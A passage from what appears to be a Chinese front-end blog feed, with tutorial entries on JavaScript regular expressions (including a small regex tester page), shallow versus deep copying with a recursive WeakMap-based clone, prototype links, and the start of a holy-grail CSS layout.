class="line">&quot;Boolean|Number|String|Function|Array|Date|RegExp|Object|Error&quot;.split(&quot;|&quot;).forEach(function(item) &#123;</span><br><span class="line">utils[&quot;is&quot; + item] = function(obj) &#123;</span><br><span class="line">return &#123;&#125;.toString.call(obj) == &quot;[object &quot; + item + &quot;]&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;);</span><br><span class="line">console.log( utils.isArray([1, 2, 3]) );</span><br><span class="line">// =&gt; true</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>3.3 if语句中使用正则替代&amp;&amp;</strong></p><p>比如，模拟<code>ready</code>函数，即加载完毕后再执行回调（不兼容ie的）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">var readyRE = /complete|loaded|interactive/;</span><br><span class="line"></span><br><span class="line">function ready(callback) &#123;</span><br><span class="line">if (readyRE.test(document.readyState) &amp;&amp; document.body) &#123;</span><br><span class="line">callback()</span><br><span class="line">&#125; </span><br><span class="line">else &#123;</span><br><span class="line">document.addEventListener(</span><br><span class="line">&apos;DOMContentLoaded&apos;, </span><br><span class="line">function () &#123;</span><br><span class="line">callback()</span><br><span class="line">&#125;,</span><br><span class="line">false</span><br><span class="line">);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">ready(function() &#123;</span><br><span class="line">alert(&quot;加载完毕！&quot;)</span><br><span class="line">&#125;);</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>3.4 使用强大的replace</strong></p><p>因为<code>replace</code>方法比较强大，有时用它根本不是为了替换，只是拿其匹配到的信息来做文章。</p><p>这里以查询字符串（querystring）压缩技术为例，注意下面<code>replace</code>方法中，回调函数根本没有返回任何东西。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function compress(source) &#123;</span><br><span class="line">var keys = &#123;&#125;;</span><br><span class="line">source.replace(/([^=&amp;]+)=([^&amp;]*)/g, function(full, key, value) &#123;</span><br><span class="line">keys[key] = (keys[key] ? keys[key] + &apos;,&apos; : &apos;&apos;) + value;</span><br><span class="line">&#125;);</span><br><span class="line">var result = [];</span><br><span class="line">for (var key in keys) &#123;</span><br><span class="line">result.push(key + &apos;=&apos; + keys[key]);</span><br><span class="line">&#125;</span><br><span class="line">return result.join(&apos;&amp;&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log( compress(&quot;a=1&amp;b=2&amp;a=3&amp;b=4&quot;) );</span><br><span class="line">// =&gt; &quot;a=1,3&amp;b=2,4&quot;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>3.5 综合运用</strong></p><p>最后这里再做个简单实用的正则测试器。</p><p>具体效果如下：<img src="https://user-gold-cdn.xitu.io/2017/9/30/d3c3b86f36bf9d9b98509f1c7a7a921a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p><img src="https://user-gold-cdn.xitu.io/2017/7/12/f56c1319ec49ee892bb73819e9ddefd9?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="img"></p><p>代码，直接贴了，相信你能看得懂：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">&lt;section&gt;</span><br><span class="line">&lt;div id=&quot;err&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;input id=&quot;regex&quot; placeholder=&quot;请输入正则表达式&quot;&gt;</span><br><span class="line">&lt;input id=&quot;text&quot; placeholder=&quot;请输入测试文本&quot;&gt;</span><br><span class="line">&lt;button id=&quot;run&quot;&gt;测试一下&lt;/button&gt;</span><br><span class="line">&lt;div id=&quot;result&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/section&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">section&#123;</span><br><span class="line">display:flex;</span><br><span class="line">flex-direction:column;</span><br><span class="line">justify-content:space-around;</span><br><span class="line">height:300px;</span><br><span class="line">padding:0 200px;</span><br><span class="line">&#125;</span><br><span class="line">section *&#123;</span><br><span class="line">min-height:30px;</span><br><span class="line">&#125;</span><br><span class="line">#err &#123;</span><br><span class="line">color:red;</span><br><span class="line">&#125;</span><br><span class="line">#result&#123;</span><br><span class="line">line-height:30px;</span><br><span class="line">&#125;</span><br><span class="line">.info &#123;</span><br><span class="line">background:#00c5ff;</span><br><span class="line">padding:2px;</span><br><span class="line">margin:2px;</span><br><span class="line">display:inline-block;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">(function() &#123;</span><br><span class="line">// 获取相应dom元素</span><br><span class="line">var regexInput = document.getElementById(&quot;regex&quot;);</span><br><span class="line">var textInput = document.getElementById(&quot;text&quot;);</span><br><span class="line">var runBtn = document.getElementById(&quot;run&quot;);</span><br><span class="line">var errBox = document.getElementById(&quot;err&quot;);</span><br><span class="line">var resultBox = document.getElementById(&quot;result&quot;);</span><br><span class="line"></span><br><span class="line">// 绑定点击事件</span><br><span class="line">runBtn.onclick = function() &#123;</span><br><span class="line">// 清除错误和结果</span><br><span class="line">errBox.innerHTML = &quot;&quot;;</span><br><span class="line">resultBox.innerHTML = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">// 获取正则和文本</span><br><span class="line">var text = textInput.value;</span><br><span class="line">var regex = regexInput.value;</span><br><span class="line"></span><br><span class="line">if (regex == &quot;&quot;) &#123;</span><br><span class="line">errBox.innerHTML = &quot;请输入正则表达式&quot;;</span><br><span class="line">&#125; else if (text == &quot;&quot;) &#123;</span><br><span class="line">errBox.innerHTML = &quot;请输入测试文本&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">regex = createRegex(regex);</span><br><span class="line">if (!regex) return;</span><br><span class="line">var result, results = [];</span><br><span class="line"></span><br><span class="line">// 没有修饰符g的话，会死循环</span><br><span class="line">if (regex.global) &#123;</span><br><span class="line">while(result = regex.exec(text)) &#123;</span><br><span class="line">results.push(result);</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">results.push(regex.exec(text));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (results[0] == null) &#123;</span><br><span class="line">resultBox.innerHTML = &quot;匹配到0个结果&quot;;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 倒序是有必要的</span><br><span class="line">for (var i = results.length - 1; i &gt;= 0; i--) &#123;</span><br><span class="line">var result = results[i];</span><br><span class="line">var match = result[0];</span><br><span class="line">var prefix = text.substr(0, result.index);</span><br><span class="line">var suffix = text.substr(result.index + match.length);</span><br><span class="line">text = prefix </span><br><span class="line">+ &apos;&lt;span class=&quot;info&quot;&gt;&apos;</span><br><span class="line">+ match</span><br><span class="line">+ &apos;&lt;/span&gt;&apos;</span><br><span class="line">+ suffix;</span><br><span class="line">&#125;</span><br><span class="line">resultBox.innerHTML = &quot;匹配到&quot; + results.length + &quot;个结果:&lt;br&gt;&quot; + text;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 生成正则表达式，核心函数</span><br><span class="line">function createRegex(regex) &#123;</span><br><span class="line">try &#123;</span><br><span class="line">if (regex[0] == &quot;/&quot;) &#123;</span><br><span class="line">regex = regex.split(&quot;/&quot;);</span><br><span class="line">regex.shift();</span><br><span class="line">var flags = regex.pop();</span><br><span class="line">regex = regex.join(&quot;/&quot;);</span><br><span class="line">regex = new RegExp(regex, flags);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">regex = new RegExp(regex, &quot;g&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return regex;</span><br><span class="line">&#125; catch(e) &#123;</span><br><span class="line">errBox.innerHTML = &quot;无效的正则表达式&quot;;</span><br><span class="line">return false;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/script&gt;复制代码</span><br></pre></td></tr></table></figure><h3 id="第七章小结"><a href="#第七章小结" class="headerlink" title="第七章小结"></a>第七章小结</h3><p>相关API的注意点，本章基本上算是一网打尽了。</p><p>至于文中的例子，都是点睛之笔，没有详细解析。如有理解不透的，建议自己敲一敲。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>其实本文首发于：<a href="https://link.juejin.im/?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F27653434" target="_blank" rel="noopener">正则表达式系列总结 - 知乎专栏</a></p><p>原文是一个系列。一直等到老姚成为掘金的专栏作者，经过仔细考虑，在掘金平台没有采用系列形式，而是合成为了一篇文章。这样既便于读者阅读，最起码能一气呵成地阅读。同时也便于作者统一回复留言。</p><p>文章要结束了，最后还要有几点说明。</p><h3 id="1-需要注意的地方"><a href="#1-需要注意的地方" class="headerlink" title="1. 需要注意的地方"></a>1. 需要注意的地方</h3><p>本文主要讨论的是JavaScript的正则表达式，更精确地说是ES5的正则表达式。</p><p>JavaScript的正则表达式引擎是传统型NFA的，因此本系列的讨论是适合任何一门正则引擎是传统型NFA的编程语言。当然，市面上大部分语言的正则引擎都是这种的。而JS里正则涉及到的所有语法要点，是这种引擎支持的核心子集。也就是说，要学正则表达式，不妨以JS正则为出发点。</p>]]></content>
      
      
      <categories>
          
          <category> 正则表达式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浅拷贝与深拷贝</title>
      <link href="2018/09/27/%E6%95%B4%E7%90%86-%E6%B5%85%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B7%B1%E6%8B%B7%E8%B4%9D/"/>
      <url>2018/09/27/%E6%95%B4%E7%90%86-%E6%B5%85%E6%8B%B7%E8%B4%9D%E4%B8%8E%E6%B7%B1%E6%8B%B7%E8%B4%9D/</url>
      
        <content type="html"><![CDATA[<h1 id="一、场景"><a href="#一、场景" class="headerlink" title="一、场景"></a>一、场景</h1><p>除了基本类型跟null,对象之间的赋值，只是将地址指向同一个，而不是真正意义上的拷贝</p><p>将一个对象赋值给另外一个对象。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,2,3];</span><br><span class="line">var b = a;</span><br><span class="line">b.push(4); // b中添加了一个4</span><br><span class="line">alert(a); // a变成了[1,2,3,4]</span><br></pre></td></tr></table></figure><a id="more"></a><p>自定义对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;a:10&#125;;</span><br><span class="line">var obj2 = obj;</span><br><span class="line">obj2.a = 20; // obj2.a改变了，</span><br><span class="line">alert(obj.a); // 20，obj的a跟着改变</span><br></pre></td></tr></table></figure><p>这就是由于对象类型直接赋值，只是将引用指向同一个地址，导致修改了obj会导致obj2也被修改</p><h1 id="二、浅拷贝"><a href="#二、浅拷贝" class="headerlink" title="二、浅拷贝"></a>二、浅拷贝</h1><p>所以，我们需要封装一个函数，来对对象进行拷贝，通过for in 循环获取基本类型，赋值每一个基本类型，才能真正意义上的复制一个对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>:<span class="number">10</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> newobj = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="keyword">var</span> attr <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        newobj[attr] = obj[attr];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newobj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj2 = copy(obj);</span><br><span class="line">obj2.a = <span class="number">20</span>;</span><br><span class="line">alert(obj.a); <span class="comment">//10</span></span><br></pre></td></tr></table></figure><p>这样就解决了对象赋值的问题。</p><h1 id="三、深拷贝"><a href="#三、深拷贝" class="headerlink" title="三、深拷贝"></a>三、深拷贝</h1><p>但是这里存在隐患，如果obj中，a的值不是10，而是一个对象，这样就会导致在for in中，将a这个对象的引用赋值为新对象，导致存在对象引用的问题。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>:&#123;<span class="attr">b</span>:<span class="number">10</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> newobj = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="keyword">var</span> attr <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        newobj[attr] = obj[attr];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newobj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj2 = copy(obj);</span><br><span class="line">obj2.a.b = <span class="number">20</span>;</span><br><span class="line">alert(obj.a.b); <span class="comment">//20</span></span><br></pre></td></tr></table></figure><p>因此，由于这个copy对象只是对第一层进行拷贝，无法拷贝深层的对象，这个copy为浅拷贝，我们需要通过递归，来拷贝深层的对象。将copy改造成递归即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>:&#123;<span class="attr">b</span>:<span class="number">10</span>&#125;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepCopy</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">typeof</span> obj != <span class="string">'object'</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> newobj = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="keyword">var</span> attr <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        newobj[attr] = deepCopy(obj[attr]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newobj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj2 = deepCopy(obj);</span><br><span class="line">obj2.a.b = <span class="number">20</span>;</span><br><span class="line">alert(obj.a.b); <span class="comment">//10</span></span><br></pre></td></tr></table></figure><p>原文地址：<a href="https://www.cnblogs.com/linhp/p/6085826.html" target="_blank" rel="noopener">https://www.cnblogs.com/linhp/p/6085826.html</a></p><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = a;</span><br><span class="line">b.push(<span class="number">4</span>); <span class="comment">// b中添加了一个4</span></span><br><span class="line">alert(a); <span class="comment">// a变成了[1,2,3,4] </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">a</span>:<span class="number">10</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj2 = obj;</span><br><span class="line">obj2.a = <span class="number">20</span>; <span class="comment">// obj2.a改变了，</span></span><br><span class="line">alert(obj.a); <span class="comment">// 20，obj的a跟着改变</span></span><br></pre></td></tr></table></figure><p>深拷贝和浅拷贝是针对复杂数据类型来说的，浅拷贝只拷贝一层，而深拷贝是层层拷贝。</p><h4 id="深拷贝"><a href="#深拷贝" class="headerlink" title="深拷贝"></a>深拷贝</h4><blockquote><p>深拷贝复制变量值，对于非基本类型的变量，则递归至基本类型变量后，再复制。深拷贝后的对象与原来的对象是完全隔离的，互不影响，对一个对象的修改并不会影响另一个对象。</p></blockquote><h4 id="浅拷贝"><a href="#浅拷贝" class="headerlink" title="浅拷贝"></a>浅拷贝</h4><blockquote><p>浅拷贝是会将对象的每个属性进行依次复制，但是当对象的属性值是引用类型时，实质复制的是其引用，当引用指向的值改变时也会跟着变化。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//Object.assign() 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    name:<span class="string">'a'</span>,</span><br><span class="line">    hobbies:&#123;</span><br><span class="line">        like:<span class="string">'coding'</span>,</span><br><span class="line">        hate:<span class="string">'reading'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;     </span><br><span class="line"><span class="keyword">let</span> obj2 = <span class="built_in">Object</span>.assign(&#123;&#125;,obj)</span><br><span class="line"><span class="keyword">let</span> obj3 = <span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(obj))</span><br><span class="line">obj.hobbies.like = <span class="string">'reading'</span></span><br><span class="line">obj.name=<span class="string">'b'</span></span><br><span class="line"><span class="built_in">console</span>.log(obj)</span><br><span class="line"><span class="built_in">console</span>.log(obj2) <span class="comment">//name:a,like:reading,说明没有实现深拷贝</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//JSON.parse(JSON.stringify(obj))我们一般用来深拷贝，其过程说白了 就是利用JSON.stringify 将js对象序列化（JSON字符串），再使用JSON.parse来反序列化(还原)js对象</span></span><br><span class="line"><span class="built_in">console</span>.log(obj3) <span class="comment">//实现了深拷贝，但是存在问题</span></span><br></pre></td></tr></table></figure><blockquote><p>JSON.parse(JSON.stringify(obj)) 的问题：</p><ol><li>如果obj里面有时间对象，则JSON.stringify后再JSON.parse的结果，时间将只是字符串的形式。而不是时间对象；</li><li>如果obj里有RegExp、Error对象，则序列化的结果将只得到空对象；</li><li>如果obj里有函数，undefined，则序列化的结果会把函数或 undefined丢失；</li><li>如果obj里有NaN、Infinity和-Infinity，则序列化的结果会变成null</li><li>JSON.stringify()只能序列化对象的可枚举的自有属性，例如 如果obj中的对象是有构造函数生成的， 则使用JSON.parse(JSON.stringify(obj))深拷贝后，会丢弃对象的constructor；</li><li>如果对象中存在循环引用的情况也无法正确实现深拷贝；</li></ol></blockquote><h3 id="递归方法实现深拷贝原理："><a href="#递归方法实现深拷贝原理：" class="headerlink" title="递归方法实现深拷贝原理："></a>递归方法实现深拷贝原理：</h3><p>遍历对象、数组直到里边都是基本数据类型，然后再去复制，就是深度拷贝。</p><blockquote><p>有种特殊情况需注意就是对象存在循环引用的情况，即对象的属性直接的引用了自身的情况，解决循环引用问题，我们可以额外开辟一个存储空间，来存储当前对象和拷贝对象的对应关系，当需要拷贝当前对象时，先去存储空间中找，有没有拷贝过这个对象，如果有的话直接返回，如果没有的话继续拷贝，这样就巧妙化解的循环引用的问题。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepClone</span>(<span class="params">obj, hash = new WeakMap(</span>)) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (obj === <span class="literal">null</span>) <span class="keyword">return</span> obj; </span><br><span class="line">  <span class="comment">// 如果是null或者undefined我就不进行拷贝操作</span></span><br><span class="line">  <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="built_in">Date</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(obj);</span><br><span class="line">  <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="built_in">RegExp</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">RegExp</span>(obj);</span><br><span class="line">  <span class="comment">// 可能是对象或者普通的值  如果是函数的话是不需要深拷贝</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> obj !== <span class="string">"object"</span>) <span class="keyword">return</span> obj;</span><br><span class="line">  <span class="comment">// 是对象的话就要进行深拷贝</span></span><br><span class="line">  <span class="keyword">if</span> (hash.get(obj)) <span class="keyword">return</span> hash.get(obj);</span><br><span class="line">  <span class="keyword">let</span> cloneObj = <span class="keyword">new</span> obj.constructor();</span><br><span class="line">  <span class="comment">// 找到的是所属类原型上的constructor,而原型上的 constructor指向的是当前类本身</span></span><br><span class="line">  hash.set(obj, cloneObj);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj.hasOwnProperty(key)) &#123;</span><br><span class="line">      <span class="comment">// 实现一个递归拷贝</span></span><br><span class="line">      cloneObj[key] = deepClone(obj[key], hash);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cloneObj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">name</span>: <span class="number">1</span>, <span class="attr">address</span>: &#123; <span class="attr">x</span>: <span class="number">100</span> &#125; &#125;;</span><br><span class="line">obj.o = obj; <span class="comment">// 对象存在循环引用的情况</span></span><br><span class="line"><span class="keyword">let</span> d = deepClone(obj);</span><br><span class="line">obj.address.x = <span class="number">200</span>;</span><br><span class="line"><span class="built_in">console</span>.log(d);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>原型和原型链</title>
      <link href="2018/09/19/%E6%95%B4%E7%90%86-%E5%8E%9F%E5%9E%8B%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/"/>
      <url>2018/09/19/%E6%95%B4%E7%90%86-%E5%8E%9F%E5%9E%8B%E5%92%8C%E5%8E%9F%E5%9E%8B%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<ul><li>原型：<a href="https://blog.csdn.net/u012468376/article/details/53121081" target="_blank" rel="noopener">https://blog.csdn.net/u012468376/article/details/53121081</a> </li><li>原型链：<a href="https://blog.csdn.net/u012468376/article/details/53127929" target="_blank" rel="noopener">https://blog.csdn.net/u012468376/article/details/53127929</a></li></ul><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>圣杯布局和双飞翼布局</title>
      <link href="2018/09/18/%E5%9C%A3%E6%9D%AF%E5%B8%83%E5%B1%80%E5%92%8C%E5%8F%8C%E9%A3%9E%E7%BF%BC%E5%B8%83%E5%B1%80/"/>
      <url>2018/09/18/%E5%9C%A3%E6%9D%AF%E5%B8%83%E5%B1%80%E5%92%8C%E5%8F%8C%E9%A3%9E%E7%BF%BC%E5%B8%83%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<p>圣杯布局跟双飞翼布局的实现，目的都是左右两栏固定宽度，中间部分自适应。<br>中间栏放在最前面优先渲染。 </p><a id="more"></a><h2 id="圣杯布局"><a href="#圣杯布局" class="headerlink" title="圣杯布局"></a>圣杯布局</h2><h3 id="1-这是初始状态，我们来构造圣杯布局"><a href="#1-这是初始状态，我们来构造圣杯布局" class="headerlink" title="1.这是初始状态，我们来构造圣杯布局"></a>1.这是初始状态，我们来构造圣杯布局</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">.header &#123;</span></span><br><span class="line"><span class="undefined">width: 100%;</span></span><br><span class="line"><span class="undefined">height: 30px;</span></span><br><span class="line"><span class="undefined">background: red;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">.content &#123;</span></span><br><span class="line"><span class="undefined">padding: 0 100px;/*左右各留出100px*/</span></span><br><span class="line"><span 